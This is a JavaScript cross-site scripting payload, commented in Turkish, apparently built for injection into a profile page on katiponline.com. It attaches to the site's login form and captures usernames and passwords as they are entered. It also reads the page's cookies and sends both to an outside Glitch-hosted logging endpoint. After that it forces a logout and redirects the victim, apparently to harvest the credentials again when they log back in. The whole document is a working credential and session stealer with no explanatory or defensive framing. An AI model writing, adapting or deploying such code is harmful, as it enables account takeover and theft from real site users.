(function () {
  let isScriptActive = true; // Script’in aktif olup olmadığını kontrol eden bayrak
  const xssProfileUrl = 'https://katiponline.com/duello/profildetay?t=45593'; // XSS profil URL’si

  // Butonları izleyen fonksiyon
  function setupButtonListeners() {
    if (!isScriptActive) {
      return;
    }

    const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
    if (loginButton) {
      loginButton.addEventListener('click', () => {
        setTimeout(setupLoginListener, 100); // Modal açıldıktan sonra listener kur
      });
    }
  }

  // Giriş yap butonunu dinleyen fonksiyon
  function setupLoginListener() {
    const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
    if (loginBtn && isScriptActive) {
      loginBtn.addEventListener('click', () => {
        const username = document.getElementById('loginname').value;
        const password = document.getElementById('loginpassport').value;
        const remember = document.getElementById('authCheck').checked;
        const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;

        // Asenkron olarak Glitch’e gönder, orijinal isteği engelleme
        fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
          method: 'GET',
          credentials: 'include'
        })
          .then(() => {
            isScriptActive = false; // Scripti kapat
          })
          .catch(() => {
            isScriptActive = false; // Hata olsa bile kapat
          });
        // Orijinal girisyap() fonksiyonu kendi isteğini yapacak
      });
    }
  }

  // Çıkış yapma
  const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
  if (!hasLoggedOut && isScriptActive) {
    setTimeout(() => {
      const cookies = document.cookie || '';
      if (cookies) {
        fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
          method: 'GET',
          credentials: 'include'
        })
          .then(() => {
            if (typeof cikisyap === 'function') {
              cikisyap();
              setTimeout(() => {
                sessionStorage.setItem('hasLoggedOut', 'true');
                window.location.replace('https://katiponline.com/duello/profildetay?t=45593');
              }, 1000);
            }
          })
          .catch(() => {
            if (typeof cikisyap === 'function') {
              cikisyap();
              setTimeout(() => {
                sessionStorage.setItem('hasLoggedOut', 'true');
                window.location.replace('https://katiponline.com/duello/profildetay?t=45593');
              }, 1000);
            }
          });
      } else {
        if (typeof cikisyap === 'function') {
          cikisyap();
          setTimeout(() => {
            sessionStorage.setItem('hasLoggedOut', 'true');
            window.location.replace('https://katiponline.com/duello/profildetay?t=45593');
          }, 1000);
        }
      }
    }, 2000);
  }

  // Sayfa yüklendiğinde butonları izlemeye başla
  if (isScriptActive) {
    window.addEventListener('load', () => {
      setupButtonListeners();
    });

    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        setupButtonListeners();
      }
    }, 500);
  }
})();
